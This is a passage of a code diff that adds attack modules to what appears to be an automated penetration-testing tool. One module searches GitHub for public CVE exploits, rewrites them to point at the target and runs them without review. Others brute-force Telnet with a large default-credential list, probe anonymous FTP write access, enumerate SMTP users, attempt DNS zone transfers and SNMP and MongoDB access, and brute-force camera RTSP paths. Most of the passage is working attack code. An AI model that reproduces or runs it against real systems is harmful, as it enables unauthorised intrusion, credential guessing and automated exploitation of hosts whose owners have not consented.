+    Attempts to find and execute a public exploit for a given CVE ID.
+    This function is designed to be aggressive, aiming for RCE or significant info disclosure.
+    """
+    output.print(f"\n[+] Initiating aggressive exploit attempt for {cve_id} on {target}...")
+    try:
+        # 1. Find Exploit Code using Web Search
+        output.print(f"  [INFO] Searching for high-impact exploits (RCE, SQLi) for {cve_id}...")
+        search_query = f'"{cve_id}" exploit PoC RCE python github'
+        
+        # Use the google_web_search tool
+        search_results = google_web_search(query=search_query)
+
+        if not search_results or not hasattr(search_results, 'results') or not search_results.results:
+            output.print(f"  [WARNING] No potential exploit URLs found for {cve_id} via web search.")
+            return
+
+        exploit_url = None
+        for result in search_results.results:
+            if 'github.com' in result.url and '.py' in result.url:
+                exploit_url = result.url
+                output.print(f"  [INFO] Found promising Python exploit on GitHub: {exploit_url}")
+                break
+
+        if not exploit_url:
+            output.print("  [WARNING] Could not find a suitable Python exploit on GitHub. Aborting CVE attack.")
+            return
+
+        # 2. Fetch Exploit Code
+        output.print(f"  [INFO] Fetching exploit code from {exploit_url}...")
+        fetched_content = web_fetch(prompt=f"get the raw code from {exploit_url}")
+
+        if not fetched_content or not fetched_content.content:
+            output.print("  [ERROR] Failed to fetch exploit code content.")
+            return
+
+        exploit_code = fetched_content.content
+
+        # 3. AI-driven Code Analysis and Adaptation
+        output.print("  [AI] Analyzing and adapting the exploit code for the target...")
+        # This is a simplified representation of AI-driven adaptation.
+        domain = target.split('//')[-1].split('/')[0]
+        adapted_code = exploit_code.replace("https://example.com", target).replace("http://example.com", target)
+        adapted_code = adapted_code.replace("TARGET_URL", target).replace("RHOST", domain)
+
+        if adapted_code == exploit_code:
+            output.print("  [AI-WARNING] AI could not automatically adapt the code. Proceeding with original, but it may fail.")
+        else:
+            output.print("  [AI-SUCCESS] Exploit code adapted for the target.")
+
+        # 4. Execute Exploit
+        exploit_filename = f"/tmp/{cve_id}_{int(time.time())}.py"
+        output.print(f"  [INFO] Saving adapted exploit to {exploit_filename}")
+        write_file(file_path=exploit_filename, content=adapted_code)
+
+        command_to_run = f"python3 {exploit_filename}"
+        if "sys.argv" in adapted_code:
+             command_to_run = f"python3 {exploit_filename} {target}"
+
+        output.print(f"  [EXEC] Running exploit with command: '{command_to_run}' (Timeout: 300s)")
+        result = run_shell_command(command=f"timeout 300 {command_to_run}", description=f"Execute {cve_id} exploit.")
+
+        # 5. Verify Success and Report
+        evidence = f"EXPLOIT URL: {exploit_url}\nCOMMAND: {command_to_run}\nSTDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}"
+        if result.exit_code == 0 and (re.search(r'uid=\d+|nt authority\\system|root:x:0:0', result.stdout, re.IGNORECASE)):
+            output.print(f"  [CRITICAL-SUCCESS] Exploit for {cve_id} likely succeeded! RCE achieved.")
+            report.add_finding(
+                vulnerability=f"Remote Code Execution via {cve_id}",
+                severity="Critical",
+                url=target,
+                parameter="N/A",
+                payload=exploit_url,
+                description=f"Successfully exploited {cve_id} to achieve Remote Code Execution.",
+                remediation=f"Patch the system immediately for {cve_id}. Refer to the vendor's security advisory.",
+                evidence=evidence
+            )
+        elif result.exit_code == 0 and result.stdout:
+             output.print(f"  [HIGH-SUCCESS] Exploit for {cve_id} executed and returned output. Manual verification needed.")
+             report.add_finding(
+                vulnerability=f"Potential Exploit Success for {cve_id}",
+                severity="High",
+                url=target,
+                parameter="N/A",
+                payload=exploit_url,
+                description=f"Exploit for {cve_id} executed without obvious errors and produced output. This could indicate information disclosure or another form of successful exploitation.",
+                remediation=f"Patch the system for {cve_id}. Manually verify the output to determine the full impact.",
+                evidence=evidence
+            )
+        else:
+            output.print(f"  [INFO] Exploit for {cve_id} finished. Exit code: {result.exit_code}. No clear success indicators found.")
+
+        # 6. Cleanup
+        os.remove(exploit_filename)
+        output.print(f"  [INFO] Cleaned up temporary exploit file: {exploit_filename}")
+
+    except Exception as e:
+        output.print(f"  [CRITICAL-ERROR] The CVE exploit module failed unexpectedly for {cve_id}: {e}")
+        output.print("  [INFO] This error will be ignored, and the scan will continue with other modules.")
+        # We log the error but do not re-raise it, ensuring the main tool continues.
+
 
 # --- SQL Injection Module ---
 
@@ -2152,6 +2797,1173 @@ async def perform_http_smuggling_attack(target_url, headers=None, cookies=None, 
 
     return vulnerabilities
 
+async def perform_exposed_services_attack(target, output, report, session_cookies=None):
+    output.print("\n[+] Starting Enhanced Scan for Exposed Basic Services...")
+    domain = get_domain(normalize_target(target))
+    
+    service_ports = {
+        "FTP": 21, "SSH": 22, "Telnet": 23, "SMTP": 25, "DNS": 53,
+        "SMB (NetBIOS)": 139, "SNMP": 161, "SMB (Direct)": 445, "RDP": 3389, "VNC": 5900
+    }
+
+    limited_credentials = [
+        ('root', 'root'), ('admin', 'admin'), ('admin', 'password'), ('test', 'test'),
+        ('user', 'user'), ('ubuntu', 'ubuntu'), ('guest', 'guest')
+    ]
+    try:
+        domain_parts = domain.split('.')
+        base_name = domain_parts[0]
+        limited_credentials.extend([
+            ('admin', base_name), ('admin', f"{base_name}123"),
+            (base_name, base_name), ('root', base_name)
+        ])
+    except Exception:
+        pass
+
+    vulnerable_versions = {
+        "vsftpd 2.3.4": "Critical - Backdoor (RCE)",
+        "ProFTPD 1.3.5": "Critical - RCE",
+        "OpenSSH 7.7": "High - User Enumeration (CVE-2018-15473)"
+    }
+
+    VULNERABLE_SSH_VERSIONS = {
+        "OpenSSH_7.7": "High - User Enumeration (CVE-2018-15473)",
+        "OpenSSH_7.2p2 Ubuntu-4ubuntu2.2": "Medium - Authentication Bypass (CVE-2016-6210)",
+        "OpenSSH_5.3": "High - Pre-auth user enumeration (CVE-2012-0814)"
+    }
+
+    COMMON_CREDENTIALS = [
+        ('root', 'root'), ('admin', 'admin'), ('admin', 'password'), ('test', 'test'),
+        ('user', 'user'), ('ubuntu', 'ubuntu'), ('guest', 'guest'), ('pi', 'raspberry'),
+        ('operator', 'operator'), ('support', 'support'), ('ftp', 'ftp'), ('anonymous', 'anonymous'),
+        ('admin', '123456'), ('admin', '1234'), ('user', '12345'), ('test', '12345'),
+        ('admin', 'admin123'), ('admin', 'password123'), ('manager', 'secret'), ('support', '123456789'),
+        ('111111', '111111'), ('000000', '000000'), ('default', 'default'), ('changeme', 'changeme'),
+        ('welcome', 'welcome'), ('system', 'system'), ('toor', 'toor'), ('pass', 'pass'),
+        ('letmein', 'letmein'), ('security', 'security'), ('football', 'football'), ('sunshine', 'sunshine'),
+        ('raspberry', 'raspberry'), ('tomcat', 'tomcat'), ('jboss', 'jboss'), ('oracle', 'oracle'),
+        ('postgres', 'postgres'), ('mysql', 'mysql'), ('mssql', 'mssql'), ('admin', 'admin'),
+        ('admin', 'admin1'), ('admin', 'admin12'), ('admin', 'admin12345'), ('admin', 'admin123456'),
+        ('admin', 'administrator'), ('admin', 'adminadmin'), ('admin', 'adminpass'), ('admin', 'adminpass123'),
+        ('admin', 'admin@123'), ('admin', 'Password@123'), ('admin', 'Welcome123!'), ('admin', 'Changeme123!'),
+        ('admin', '123!@#'), ('admin', 'adm'), ('admin', 'sys'), ('admin', '1234567'), ('admin', 'P@ssword'),
+        ('admin', 'p@ssword'), ('admin', 'password!'), ('admin', 'admin!'), ('admin', 'root!'),
+        ('admin', '123'), ('admin', 'pass123'), ('admin', 'user123'), ('admin', 'login'),
+        ('admin', 'master'), ('admin', 'key'), ('admin', 'access'), ('admin', 'local'),
+        ('admin', 'live'), ('admin', 'demo'), ('admin', 'test1234'), ('admin', 'qwerty1234'),
+        ('admin', 'iloveyou'), ('admin', 'company'), ('admin', '1234567890'), ('admin', 'password1234'),
+        ('admin', 'admin1234'), ('admin', 'changeme123'), ('admin', 'Welcome123'), ('admin', '!@#$%^&*'),
+        ('admin', 'p@55w0rd'), ('admin', 'P@55w0rd'), ('admin', 'letmein123'), ('admin', 'admin2023'),
+        ('admin', 'admin2024'), ('admin', 'admin2025'), ('admin', 'admin2026'), ('admin', 'companyname'),
+        ('admin', '12345678901'), ('admin', '123456789012'), ('admin', '123qweasd'), ('admin', '1qaz2wsx3edc'),
+        ('admin', '1qaz@WSX'), ('admin', '2023'), ('admin', '2024'), ('admin', '2025'), ('admin', '2026'),
+    ]
+
+    for service_name, port in service_ports.items():
+        output.print(f"  [*] Checking {service_name} on port {port}...")
+        try:
+            reader, writer = await asyncio.wait_for(asyncio.open_connection(domain, port), timeout=4)
+            
+            # General Banner Grabbing
+            banner = ""
+            try:
+                banner_bytes = await asyncio.wait_for(reader.read(1024), timeout=3)
+                banner = banner_bytes.decode(errors='ignore').strip()
+                if banner:
+                    output.print(f"    [INFO] Port {port} ({service_name}) is open. Banner: {banner}")
+            except asyncio.TimeoutError:
+                 output.print(f"    [INFO] Port {port} ({service_name}) is open, but no banner received.")
+            except Exception:
+                 output.print(f"    [INFO] Port {port} ({service_name}) is open.")
+
+            # --- Idea 1: Banner/Version Analysis ---
+            for version, vuln_info in vulnerable_versions.items():
+                if version.lower() in banner.lower():
+                    output.print(f"    [CRITICAL] Known vulnerable version detected: {version} ({vuln_info})")
+                    report.add_finding(
+                        type=f"Known Vulnerable Service ({vuln_info})", 
+                        severity="Critical", 
+                        url=f"{domain}:{port}", 
+                        parameter="Banner", 
+                        payload=version,
+                        description=f"The service is running a version known to be vulnerable: {vuln_info}.",
+                        remediation="Immediately upgrade the service to a patched version.", 
+                        response_snippet=banner
+                    )
+
+            # --- Service-specific checks ---
+            if service_name == "FTP":
+                writer.write(b"USER anonymous\r\n")
+                await writer.drain()
+                res_user = await asyncio.wait_for(reader.read(1024), timeout=3)
+                writer.write(b"PASS anonymous\r\n")
+                await writer.drain()
+                res_pass = await asyncio.wait_for(reader.read(1024), timeout=3)
+                
+                if b"230" in res_pass or b"230" in res_user:
+                    output.print("      [HIGH] Anonymous FTP login successful.")
+                    evidence = f"FTP banner and response:\n{banner}\n{res_user.decode(errors='ignore')}{res_pass.decode(errors='ignore')}"
+                    
+                    # --- Idea 2: Check for Write Permissions ---
+                    test_file = f"test_{get_random_string(4)}.txt"
+                    output.print(f"        [*] Checking for anonymous write permissions (STOR {test_file})...")
+                    writer.write(f"STOR {test_file}\r\n".encode())
+                    await writer.drain()
+                    res_stor = await asyncio.wait_for(reader.read(1024), timeout=3)
+                    if b"150" in res_stor or b"125" in res_stor: # 150/125 OK to send data
+                        writer.write(b"test_content\r\n.\r\n")
+                        await writer.drain()
+                        res_stor_end = await asyncio.wait_for(reader.read(1024), timeout=3)
+                        if b"226" in res_stor_end: # 226 Transfer complete
+                            output.print("        [CRITICAL] Anonymous FTP write access confirmed!")
+                            evidence += f"\nAnonymous user has WRITE PERMISSIONS. Successfully uploaded '{test_file}'."
+                            report.add_finding(
+                                type="Anonymous FTP Write Access", 
+                                severity="Critical", 
+                                url=f"{domain}:{port}", 
+                                parameter="N/A", 
+                                payload="anonymous:anonymous",
+                                description="Anonymous FTP access with write permissions is enabled, allowing anyone to upload files to the server.",
+                                remediation="Disable anonymous FTP access, or at least remove write permissions for the anonymous user.", 
+                                response_snippet=evidence
+                            )
+                            writer.write(f"DELE {test_file}\r\n".encode()) # Cleanup
+                            await writer.drain()
+                        else:
+                             report.add_finding(
+                                type="Anonymous FTP Access", 
+                                severity="High", 
+                                url=f"{domain}:{port}", 
+                                parameter="N/A", 
+                                payload="anonymous:anonymous",
+                                description="Anonymous FTP access is enabled, potentially exposing sensitive files.",
+                                remediation="Disable anonymous FTP access. Ensure proper authentication and authorization are in place.", 
+                                response_snippet=evidence
+                            )
+                    else:
+                        report.add_finding(
+                            type="Anonymous FTP Access", 
+                            severity="High", 
+                            url=f"{domain}:{port}", 
+                            parameter="N/A", 
+                            payload="anonymous:anonymous",
+                            description="Anonymous FTP access is enabled, potentially exposing sensitive files.",
+                            remediation="Disable anonymous FTP access, or at least remove write permissions for the anonymous user.", 
+                            response_snippet=evidence,
+                            future_vector="Attempt to upload files to the anonymous FTP server to check for write permissions."
+                        )
+            
+            elif service_name == "SSH":
+                output.print("      [*] Performing intelligent banner analysis for SSH...")
+                if banner:
+                    for vuln_version, vuln_info in VULNERABLE_SSH_VERSIONS.items():
+                        if vuln_version.lower() in banner.lower():
+                            output.print(f"        [CRITICAL] Known vulnerable SSH version detected: {banner} ({vuln_info})")
+                            report.add_finding(
+                                type=f"Known Vulnerable SSH ({vuln_info.split(' - ')[0]})", 
+                                severity="Critical", 
+                                url=f"{domain}:{port}", 
+                                parameter="Banner", 
+                                payload=banner,
+                                description=f"The SSH service is running a version known to be vulnerable: {banner} ({vuln_info}).",
+                                remediation="Immediately upgrade the SSH service to a patched version. Disable unnecessary features.", 
+                                response_snippet=banner
+                            )
+                            break
+                    else:
+                        output.print(f"        [INFO] SSH banner: {banner}. No known critical vulnerabilities detected in banner.")
+                else:
+                    output.print("        [INFO] No SSH banner received for analysis.")
+
+            elif service_name == "Telnet":
+                output.print("      [*] Attempting limited brute-force on Telnet...")
+                contextual_credentials = list(COMMON_CREDENTIALS)
+                try:
+                    domain_parts = domain.split('.')
+                    base_name = domain_parts[0]
+                    contextual_credentials.extend([
+                        (base_name, base_name), (base_name, f"{base_name}123"),
+                        (f"{base_name}admin", f"{base_name}admin"), (f"{base_name}user", f"{base_name}user"),
+                        ('admin', base_name), ('user', base_name), ('root', base_name)
+                    ])
+                except Exception:
+                    pass
+                
+                for user, pwd in list(set(contextual_credentials)):
+                    try:
+                        t_reader, t_writer = await asyncio.wait_for(asyncio.open_connection(domain, port), timeout=3)
+                        await asyncio.wait_for(t_reader.read(2048), timeout=3)
+                        t_writer.write(f"{user}\r\n".encode())
+                        await t_writer.drain()
+                        await asyncio.wait_for(t_reader.read(2048), timeout=3)
+                        t_writer.write(f"{pwd}\r\n".encode())
+                        await t_writer.drain()
+                        response = await asyncio.wait_for(t_reader.read(4096), timeout=3)
+                        if any(success_msg in response.decode(errors='ignore').lower() for success_msg in ['welcome', 'logged in', 'last login', '$', '#', '>']):
+                            output.print(f"        [CRITICAL] Telnet login successful with weak credentials: {user}:{pwd}")
+                            report.add_finding(
+                                type="Telnet Weak Credentials", 
+                                severity="Critical", 
+                                url=f"{domain}:{port}", 
+                                parameter="Login", 
+                                payload=f"{user}:{pwd}",
+                                description="Telnet service allows login with weak/default credentials. Telnet is also unencrypted, making communication vulnerable to eavesdropping.",
+                                remediation="Disable Telnet and use SSH. If Telnet is necessary, enforce strong authentication and consider other security measures.", 
+                                response_snippet=f"Successful credentials: {user}:{pwd}"
+                            )
+                            t_writer.close()
+                            await t_writer.wait_closed()
+                            break
+                        t_writer.close()
+                        await t_writer.wait_closed()
+                    except Exception:
+                        continue
+
+            elif service_name == "SMTP":
+                output.print("      [*] Attempting SMTP user enumeration (VRFY) and Open Relay check...")
+                try:
+                    s_reader, s_writer = await asyncio.wait_for(asyncio.open_connection(domain, port), timeout=3)
+                    banner_smtp = await s_reader.read(1024)
+                    output.print(f"        [INFO] SMTP Banner: {banner_smtp.decode(errors='ignore').strip()}")
+                    s_writer.write(b"HELO test.com\r\n")
+                    await s_writer.drain()
+                    await s_reader.read(1024)
+                    
+                    found_users = []
+                    for user in ["root", "admin", "test", "postmaster", "info", "support"]:
+                        s_writer.write(f"VRFY {user}\r\n".encode())
+                        await s_writer.drain()
+                        vrfy_res = await asyncio.wait_for(s_reader.read(1024), timeout=3)
+                        if b"250" in vrfy_res or b"252" in vrfy_res:
+                            found_users.append(user)
+                    if found_users:
+                        output.print(f"        [MEDIUM] SMTP VRFY: Found users: {', '.join(found_users)}")
+                        report.add_finding(
+                            type="SMTP User Enumeration (VRFY)", 
+                            severity="Medium", 
+                            url=f"{domain}:{port}", 
+                            parameter="VRFY", 
+                            payload=", ".join(found_users),
+                            description=f"SMTP service allows user enumeration via VRFY command. Found users: {', '.join(found_users)}.",
+                            remediation="Disable VRFY and EXPN commands on the SMTP server.", 
+                            response_snippet=f"VRFY for {', '.join(found_users)} returned success code.",
+                            future_vector="Attempt brute-force login with discovered usernames."
+                        )
+                    
+                    s_writer.write(b"MAIL FROM:<test@example.com>\r\n")
+                    await s_writer.drain()
+                    res_mail = await asyncio.wait_for(s_reader.read(1024), timeout=3)
+                    if b"250" in res_mail:
+                        s_writer.write(b"RCPT TO:<external@external.com>\r\n")
+                        await s_writer.drain()
+                        res_rcpt = await asyncio.wait_for(s_reader.read(1024), timeout=3)
+                        if b"250" in res_rcpt:
+                            output.print("        [HIGH] SMTP server might be an Open Relay.")
+                            report.add_finding(
+                                type="SMTP Open Relay", 
+                                severity="High", 
+                                url=f"{domain}:{port}", 
+                                parameter="RELAY", 
+                                payload="N/A",
+                                description="The SMTP server appears to be an open relay, which can be abused by spammers to send unsolicited emails.",
+                                remediation="Configure the SMTP server to only accept and relay mail for authorized domains and users.", 
+                                response_snippet="MAIL FROM and RCPT TO commands were accepted for external domain external.com.",
+                                future_vector="Verify open relay by sending a test email through the server."
+                            )
+                    s_writer.close()
+                    await s_writer.wait_closed()
+                except Exception as e:
+                    output.print(f"        [ERROR] SMTP check failed: {e}")
+
+            elif service_name in ["SMB (NetBIOS)", "SMB (Direct)"]:
+                output.print("      [*] Checking for anonymous SMB share listing...")
+                try:
+                    process = subprocess.run(
+                        ['smbclient', '-L', f'//{domain}', '-N'], 
+                        capture_output=True, 
+                        text=True, 
+                        encoding='utf-8', 
+                        errors='ignore',
+                        timeout=10
+                    )
+                    smb_output = process.stdout
+                    
+                    if process.returncode == 0 and "Disk" in smb_output and "IPC$" in smb_output:
+                        output.print("        [HIGH] Anonymous SMB shares found.")
+                        report.add_finding(
+                            type="Anonymous SMB Share Listing", 
+                            severity="High", 
+                            url=f"{domain}:{port}", 
+                            parameter="N/A", 
+                            payload="N/A",
+                            description="The SMB server allows anonymous listing of shares, exposing internal host and share names.",
+                            remediation="Disable anonymous access to SMB shares. Enforce authentication or restrict access to trusted IPs.", 
+                            response_snippet=f"smbclient output:\n{smb_output}",
+                            future_vector="Attempt to connect to discovered SMB shares to access files."
+                        )
+                    else:
+                        output.print("        [INFO] No anonymous SMB shares found or smbclient output was not indicative.")
+                except FileNotFoundError:
+                    output.print("        [WARNING] `smbclient` tool not found. Please ensure it is installed and in your PATH. Skipping SMB check.")
+                except subprocess.TimeoutExpired:
+                    output.print("        [INFO] SMB check timed out.")
+                except Exception as e:
+                    output.print(f"        [ERROR] SMB check failed: {e}")
+
+            elif service_name == "SNMP":
+                output.print("      [*] Checking for public/private SNMP community strings...")
+                for community in ['public', 'private']:
+                    try:
+                        process = subprocess.run(
+                            ['snmpwalk', '-v2c', '-c', community, domain, 'system'],
+                            capture_output=True,
+                            text=True,
+                            encoding='utf-8',
+                            errors='ignore',
+                            timeout=15
+                        )
+                        snmp_output = process.stdout
+                        
+                        if process.returncode == 0 and "iso." in snmp_output:
+                            output.print(f"        [HIGH] SNMP access successful with '{community}' community string.")
+                            report.add_finding(
+                                type="SNMP Weak Community String", 
+                                severity="High", 
+                                url=f"{domain}:{port}", 
+                                parameter="Community String", 
+                                payload=community,
+                                description=f"The SNMP service is accessible with the default community string '{community}', exposing sensitive device information.",
+                                remediation="Change default SNMP community strings to strong, unpredictable values. Use SNMPv3 with authentication and encryption if possible.", 
+                                response_snippet=f"snmpwalk output snippet:\n{snmp_output[:500]}...",
+                                future_vector="Attempt to enumerate more SNMP OIDs for sensitive information disclosure."
+                            )
+                            break
+                    except FileNotFoundError:
+                        output.print("        [WARNING] `snmpwalk` tool not found. Please ensure it is installed and in your PATH. Skipping SNMP check.")
+                        break
+                    except subprocess.TimeoutExpired:
+                        output.print(f"        [INFO] SNMP check for '{community}' timed out.")
+                    except Exception as e:
+                        output.print(f"        [ERROR] SNMP check for '{community}' failed: {e}")
+
+            elif service_name == "DNS":
+                output.print("      [*] Attempting DNS Zone Transfer (AXFR)...")
+                try:
+                    process = subprocess.run(
+                        ['dig', 'axfr', f'@{domain}', domain],
+                        capture_output=True,
+                        text=True,
+                        encoding='utf-8',
+                        errors='ignore',
+                        timeout=20
+                    )
+                    dig_output = process.stdout
+                    
+                    if process.returncode == 0 and "Transfer failed." not in dig_output and len(dig_output) > 200:
+                        output.print("        [HIGH] DNS Zone Transfer successful.")
+                        report.add_finding(
+                            type="DNS Zone Transfer (AXFR)", 
+                            severity="High", 
+                            url=f"{domain}:{port}", 
+                            parameter="AXFR", 
+                            payload=domain,
+                            description="The DNS server allows a full zone transfer, exposing all DNS records for the domain, which can aid in further reconnaissance.",
+                            remediation="Configure the DNS server to restrict zone transfers to trusted secondary DNS servers only.", 
+                            response_snippet=f"AXFR output snippet:\n{dig_output[:500]}...",
+                            future_vector="Analyze DNS records for internal hostnames, IP addresses, and other sensitive information."
+                        )
+                    else:
+                        output.print("        [INFO] DNS Zone Transfer failed or no significant records found.")
+                except FileNotFoundError:
+                    output.print("        [WARNING] `dig` tool not found. Please ensure it is installed and in your PATH. Skipping DNS Zone Transfer check.")
+                except subprocess.TimeoutExpired:
+                    output.print("        [INFO] DNS Zone Transfer check timed out.")
+                except Exception as e:
+                    output.print(f"        [ERROR] DNS Zone Transfer check failed: {e}")
+
+            writer.close()
+            await writer.wait_closed()
+
+        except ConnectionRefusedError:
+            output.print(f"    [INFO] Port {port} ({service_name}) is closed or filtered.")
+        except asyncio.TimeoutError:
+            output.print(f"    [INFO] Port {port} ({service_name}) timed out.")
+        except Exception as e:
+            output.print(f"    [ERROR] An unexpected error occurred during {service_name} check on port {port}: {e}")
+
+async def perform_mongodb_attack(target, output, report, session_cookies=None):
+    output.print("\n[+] Starting MongoDB Scan & Exploit...")
+    domain = get_domain(normalize_target(target))
+    port = 27017
+    output.print(f"  [*] Attempting to connect to MongoDB on {domain}:{port}...")
+    
+    loop = asyncio.get_event_loop()
+    try:
+        # pymongo.MongoClient is synchronous, so run it in a separate thread
+        client = await loop.run_in_executor(None, lambda: pymongo.MongoClient(domain, port, serverSelectionTimeoutMS=5000))
+        await loop.run_in_executor(None, client.server_info) # Triggers connection
+        output.print(f"  [HIGH] Anonymous connection to MongoDB at {domain}:{port} successful!")
+        db_list = await loop.run_in_executor(None, client.list_database_names)
+        evidence = f"Successfully connected to MongoDB at {domain}:{port} without authentication.\n"
+        evidence += f"Available databases: {db_list}"
+        output.print(f"    [SUCCESS] Found databases: {db_list}")
+        report.add_finding(
+            type="MongoDB Anonymous Access", 
+            severity="High", 
+            url=f"{domain}:{port}", 
+            parameter="N/A", 
+            payload="N/A",
+            description="The MongoDB server allows anonymous connections, potentially exposing all database contents.",
+            remediation="Enforce authentication on the MongoDB server. Bind to localhost if remote access is not required.",
+            response_snippet=evidence
+        )
+        await loop.run_in_executor(None, client.close)
+    except pymongo.errors.ServerSelectionTimeoutError:
+        output.print("  [INFO] MongoDB connection timed out. Server is likely not running or firewalled.")
+    except pymongo.errors.ConnectionFailure as e:
+        output.print(f"  [INFO] MongoDB connection failed: {e}. Authentication may be required.")
+    except Exception as e:
+        output.print(f"  [ERROR] An unexpected error occurred during MongoDB scan: {e}")
+
+async def perform_rtsp_attack(target, output, report, session_cookies=None):
+    output.print("\n[+] Starting RTSP Scan and Brute Force...")
+    domain = get_domain(normalize_target(target))
+    rtsp_ports = [554, 8554, 5554, 8080, 80, 88, 81, 555, 7070, 10554]
+    
+    common_paths = [
+        "/live", "/stream", "/stream1", "/cam1/mpeg4", "/onvif1", "/live/ch00_0", "/axis-media/media.amp",
+        "/stream.sdp", "/live.sdp", "/video.sdp", "/media.sdp", "/ch0_0.sdp", "/onvif/device_service",
+        "/onvif/media_service", "/onvif-http/snapshot", "/video", "/mpeg4", "/h264", "/av0_0",
+        "/cam/realmonitor", "/stream/video.rm", "/live/main", "/live/sub", "/stream/main", "/stream/sub",
+        "/video.mp4", "/stream.flv", "/live/ch1", "/live/ch2", "/stream/ch1", "/stream/ch2",
+        "/channel1", "/channel2", "/media/video1", "/media/video2", "/api/video", "/api/stream",
+        "/rtsp/live", "/rtsp/stream", "/1", "/2", "/3", "/4", "/5", "/6", "/7", "/8", "/9", "/10",
+        "/cam1/h264", "/cam1/video.h264", "/h264/media.h264", "/mpeg4/media.amp", "/live/h264",
+        "/live/mpeg4", "/stream/h264", "/stream/mpeg4", "/video.h264", "/video.mpeg4",
+        "/ch01_0.sdp", "/ch01_1.sdp", "/ch02_0.sdp", "/ch02_1.sdp", "/ch03_0.sdp", "/ch03_1.sdp",
+        "/media.amp?stream=1", "/video.cgi", "/mjpg/video.mjpg", "/stream/video.mjpeg",
+        "/live/ch0", "/video/mjpg.cgi", "/video.mjpg", "/mjpeg.cgi", "/mjpeg",
+        "/video/video.mjpeg", "/video/video.cgi", "/video/video.mp4", "/video/video.h264",
+        "/video/video.flv", "/video/video.asf", "/video/video.wmv", "/video/video.avi", "/video/video.mov",
+        "/stream.h264", "/stream.mpeg4", "/stream.ts", "/stream.3gp", "/stream.mov", "/stream.mjpeg",
+        "/live/ch01_0", "/live/ch01_1", "/live/ch02_0", "/live/ch02_1", "/live/ch03_0", "/live/ch03_1",
+        "/channel/1", "/channel/2", "/cam/1", "/cam/2", "/media/1", "/media/2", "/stream/1", "/stream/2",
+        "/live/1", "/live/2", "/onvif/1", "/onvif/2", "/rtsp/1", "/rtsp/2",
+        "/ufirststream", "/usecondstream", "/uthirdstream", "/videoinput_1/h264_1", "/videoinput_1/mjpeg_1",
+        "/live1.sdp", "/live2.sdp", "/Streaming/Channels/1", "/Streaming/Channels/101",
+        "/media/videoMain", "/media/videoSub",
+        # Massive expansion
+        *[f"/live/ch{i}" for i in range(3, 50)],
+        *[f"/stream/ch{i}" for i in range(3, 50)],
+        *[f"/channel/{i}" for i in range(3, 50)],
+        *[f"/cam/{i}" for i in range(3, 50)],
+        *[f"/media/{i}" for i in range(3, 50)],
+        *[f"/stream/{i}" for i in range(3, 50)],
+        *[f"/live/{i}" for i in range(3, 50)],
+        *[f"/onvif/{i}" for i in range(3, 50)],
+        *[f"/rtsp/{i}" for i in range(3, 50)],
+        *[f"/{i}" for i in range(11, 50)],
+        # Different formats and naming conventions
+        *[f"/video.{ext}" for ext in ["3gp", "asf", "avi", "mkv", "mov", "mp4", "mpeg", "mpg", "rm", "swf", "vob", "wmv"]],
+        *[f"/stream.{ext}" for ext in ["3gp", "asf", "avi", "mkv", "mov", "mp4", "mpeg", "mpg", "rm", "swf", "vob", "wmv"]],
+        *[f"/live.{ext}" for ext in ["3gp", "asf", "avi", "mkv", "mov", "mp4", "mpeg", "mpg", "rm", "swf", "vob", "wmv"]],
+        *[f"/channel{i}/stream{j}" for i in range(1, 5) for j in range(1, 5)],
+        *[f"/cam{i}/stream{j}" for i in range(1, 5) for j in range(1, 5)],
+        *[f"/live{i}_stream{j}" for i in range(1, 5) for j in range(1, 5)],
+        *[f"/stream/profile{i}" for i in range(1, 5)],
+        *[f"/video/profile{i}" for i in range(1, 5)],
+        *[f"/ch{i:02d}/0" for i in range(50)],
+        *[f"/ch{i:02d}/1" for i in range(50)],
+        # ONVIF specific
+        "/onvif/device_service", "/onvif/media_service", "/onvif/ptz_service", "/onvif/imaging_service",
+        "/onvif/events_service", "/onvif/analytics_service", "/onvif/video_analytics_service",
+        "/onvif/recording_service", "/onvif/replay_service", "/onvif/search_service",
+        # More...
+        "/Streaming/channels/1/http", "/Streaming/channels/2/http",
+        "/img/video.sav", "/av_stream", "/cam_stream", "/mjpeg_stream",
+        "/rtp/media", "/rtsp_tunnel", "/video_feed", "/live_feed",
+        "/GetData.cgi", "/GetVideo.cgi", "/GetStream.cgi",
+        "/play1.sdp", "/play2.sdp",
+        "/media/cam0/video", "/media/cam1/video",
+        "/axis-media/media.3gp", "/axis-media/media.asf",
+        "/video.mjpg", "/video.mjpg", "/video.mjpg?q=30",
+        "/stream.mjpg", "/stream.mjpeg",
+        "/live/av0", "/live/av1",
+        "/video/live", "/video/stream",
+        "/video/v1", "/video/v2",
+        "/stream/v1", "/stream/v2",
+        "/live/v1", "/live/v2",
+        # New additions to ensure 500+ RTSP paths
+        # Generic Camera/DVR/NVR Paths
+        "/unicast/c1/s1", "/unicast/c2/s1", "/unicast/c3/s1",
+        "/mpeg4/ch1/main/av_stream", "/mpeg4/ch2/main/av_stream",
+        "/h264/ch1/main/av_stream", "/h264/ch2/main/av_stream",
+        "/live/ch01_00", "/live/ch01_01", "/live/ch02_00", "/live/ch02_01",
+        "/Streaming/Channels/101", "/Streaming/Channels/102", "/Streaming/Channels/103",
+        "/axis-media/media.amp?videocodec=h264", "/axis-media/media.amp?videocodec=mpeg4",
+        "/cam/realmonitor?channel=1&subtype=0", "/cam/realmonitor?channel=1&subtype=1",
+        "/ch01/0", "/ch02/0", "/ch03/0", # Simplified channel
+        "/ch01.sdp", "/ch02.sdp", "/ch03.sdp",
+        "/live/ch0_0.sdp", "/live/ch1_0.sdp", "/live/ch2_0.sdp",
+        "/mainstream", "/substream", "/extra", "/record", "/playback",
+        "/play/live.sdp", "/vod/mp4:sample.mp4",
+        "/ISAPI/Streaming/channels/101/rtp",
+        "/onvif/profile1/media.sbn", # ONVIF related (specific to Axis)
+        "/onvif/live/1", "/onvif/live/2",
+        "/media/video/1", "/media/video/2",
+        "/PSIA/Streaming/channels/1/rtp",  # PSIA standard
+        "/PSIA/Streaming/channels/2/rtp",
+        
+        # Manufacturer-specific common paths
+        "/h264/ch1/sub/av_stream", # Hikvision
+        "/Streaming/Channels/101/h264", # Dahua
+        "/VideoInput/channels/1/stream/0", # Uniview
+        "/live/0/0/0/0", "/live/1/0/0/0", # Samsung
+        "/live/0/0/0", "/live/1/0/0", # Bosch
+        "/cam/realmonitor?channel=1&subtype=0&unicast=true&proto=rtp", # Dahua variations
+        
+        # More generated paths
+        *[f"/live/{i}/0" for i in range(100)],
+        *[f"/stream/{i}/0" for i in range(100)],
+        *[f"/channel{i}/0" for i in range(100)],
